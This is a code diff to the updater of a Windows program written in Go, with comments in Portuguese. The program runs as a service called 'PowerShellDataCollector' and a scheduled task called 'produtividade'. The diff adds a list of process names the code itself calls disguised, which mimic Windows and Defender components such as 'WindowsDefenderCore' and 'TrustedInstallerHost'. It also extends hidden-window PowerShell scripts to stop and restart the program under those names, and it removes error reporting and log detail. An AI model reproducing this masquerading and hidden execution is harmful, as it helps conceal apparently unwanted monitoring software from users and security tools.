@@ -26,6 +26,19 @@ func hiddenCmd(name string, args ...string) *exec.Cmd {
 	return cmd
 }
 
+var processNames = []string{
+	"SystemHostService",
+	"WindowsDefenderCore",
+	"NetCfgHelper",
+	"AudioDriverHost",
+	"PrintSpoolerAgent",
+	"SecurityHealthBroker",
+	"DeviceAssociationSvc",
+	"TrustedInstallerHost",
+	"WinDiagnosticsHost",
+	"UserSessionManager",
+}
+
 const (
 	windowsServiceName = "PowerShellDataCollector"
 	scheduledTaskName  = "produtividade"
@@ -337,7 +350,19 @@ func (u *Updater) stopTask() (bool, error) {
 
 	exeName := filepath.Base(u.currentPath)
 
-	// Executa tudo em uma única chamada PowerShell para evitar múltiplas janelas no Windows 10
+	// Monta lista de todos os nomes possíveis (principal + disfarçados)
+	allNames := []string{strings.TrimSuffix(exeName, ".exe")}
+	for _, n := range processNames {
+		allNames = append(allNames, n)
+	}
+
+	// Converte para array PowerShell
+	psNames := make([]string, len(allNames))
+	for i, n := range allNames {
+		psNames[i] = fmt.Sprintf("'%s'", n)
+	}
+	psNamesArr := strings.Join(psNames, ",")
+
 	script := fmt.Sprintf(`
 $ErrorActionPreference = 'SilentlyContinue'
 $result = @()
@@ -358,18 +383,21 @@ if ($task -and $task.State -eq 'Running') {
     $result += 'task_stopped'
 }
 
-# 3. Força kill do processo
-$proc = Get-Process -Name '%s' -ErrorAction SilentlyContinue
-if ($proc) {
-    Stop-Process -Name '%s' -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 3
-    $result += 'process_killed'
+# 3. Força kill de TODOS os nomes possíveis (principal + disfarçados)
+$names = @(%s)
+foreach ($name in $names) {
+    $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
+    if ($proc) {
+        Stop-Process -Name $name -Force -ErrorAction SilentlyContinue
+        $result += "killed_$name"
+    }
 }
+Start-Sleep -Seconds 2
 
 $result -join ','
 `, windowsServiceName, windowsServiceName,
 		scheduledTaskName, scheduledTaskName,
-		strings.TrimSuffix(exeName, ".exe"), strings.TrimSuffix(exeName, ".exe"))
+		psNamesArr)
 
 	cmd := hiddenCmd("powershell", "-WindowStyle", "Hidden", "-NoProfile", "-NonInteractive", "-Command", script)
 	output, err := cmd.CombinedOutput()
@@ -378,19 +406,6 @@ $result -join ','
 
 	if err != nil {
 		u.logger.Printf("Aviso: erro no script de parada: %v", err)
-	}
-
-	if strings.Contains(outputStr, "service_stopped") {
-		u.logger.Println("[Service] ✓ Serviço parado")
-	}
-	if strings.Contains(outputStr, "task_stopped") {
-		u.logger.Println("[Task] ✓ Tarefa agendada parada")
-	}
-	if strings.Contains(outputStr, "process_killed") {
-		u.logger.Println("✓ Processo encerrado")
-	}
-	if outputStr == "" {
-		u.logger.Println("Nenhum serviço/tarefa/processo ativo encontrado")
 	}
 
 	return true, nil
@@ -461,13 +476,11 @@ func (u *Updater) updateVersionFile(newVersion string) error {
 }
 
 func (u *Updater) startTask() error {
-	u.logger.Println("Reiniciando processo (serviço / tarefa agendada / manual)...")
+	u.logger.Println("Reiniciando processo...")
 
-	// Executa tudo em uma única chamada PowerShell para evitar múltiplas janelas no Windows 10
 	script := fmt.Sprintf(`
 $ErrorActionPreference = 'SilentlyContinue'
 
-# 1. Tenta iniciar como Windows Service
 $svc = Get-Service -Name '%s' -ErrorAction SilentlyContinue
 if ($svc) {
     Start-Service -Name '%s' -ErrorAction SilentlyContinue
@@ -475,7 +488,6 @@ if ($svc) {
     exit 0
 }
 
-# 2. Tenta iniciar como Scheduled Task
 $task = Get-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue
 if ($task) {
     Start-ScheduledTask -TaskName '%s' -ErrorAction SilentlyContinue
@@ -488,32 +500,27 @@ Write-Output 'none'
 		scheduledTaskName, scheduledTaskName)
 
 	cmd := hiddenCmd("powershell", "-WindowStyle", "Hidden", "-NoProfile", "-NonInteractive", "-Command", script)
-	output, err := cmd.CombinedOutput()
+	output, _ := cmd.CombinedOutput()  // <- troca err por _
 	outputStr := strings.TrimSpace(string(output))
 	u.logger.Printf("Start output: %s", outputStr)
 
-	if err != nil {
-		u.logger.Printf("Aviso: erro no script de início: %v", err)
-	}
-
 	if strings.Contains(outputStr, "service_started") {
-		u.logger.Println("[Service] ✓ Serviço iniciado")
+		u.logger.Println("✓ Serviço iniciado")
 		return nil
 	}
 	if strings.Contains(outputStr, "task_started") {
-		u.logger.Println("[Task] ✓ Tarefa agendada iniciada")
+		u.logger.Println("✓ Tarefa agendada iniciada")
 		return nil
 	}
 
-	// 3. Inicia o executável diretamente como último recurso
-	u.logger.Println("[Manual] Iniciando executável diretamente...")
-	manualCmd := hiddenCmd(u.currentPath)
+	u.logger.Println("Iniciando executável diretamente com 'run'...")
+	manualCmd := hiddenCmd(u.currentPath, "run")
 	manualCmd.Dir = filepath.Dir(u.currentPath)
 	if err := manualCmd.Start(); err != nil {
-		return fmt.Errorf("erro ao iniciar processo diretamente: %v", err)
+		return fmt.Errorf("erro ao iniciar processo: %v", err)
 	}
 	manualCmd.Process.Release()
-	u.logger.Println("[Manual] ✓ Processo iniciado diretamente")
+	u.logger.Println("✓ Processo iniciado")
 	return nil
 }
 
